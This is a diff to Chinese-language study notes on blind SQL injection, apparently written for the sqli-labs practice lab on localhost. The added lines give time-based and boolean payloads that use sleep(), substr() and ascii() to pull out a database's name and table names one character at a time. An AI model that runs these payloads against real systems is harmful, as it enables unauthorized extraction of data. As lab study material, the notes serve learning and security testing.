@@ -92,6 +92,14 @@ and if(length(database())=4 , sleep(3), 1) --+ 正确就延迟，错误就不延
 ?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' , sleep(3), 1) --+
                                                   第一个库的前几个
 
+//判断数据库的第一个字符
+http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),1,1))>100
+
+//判断数据库的第二个字符
+http://127.0.0.1/sqli/Less-5/?id=1' and ascii(substr(database(),2,1))>100
+
+...........
+由此可以判断出当前数据库为 security
 
 ?id=1" and if(ascii(substr(database(),1,1))>115,1,sleep(3))--+
 
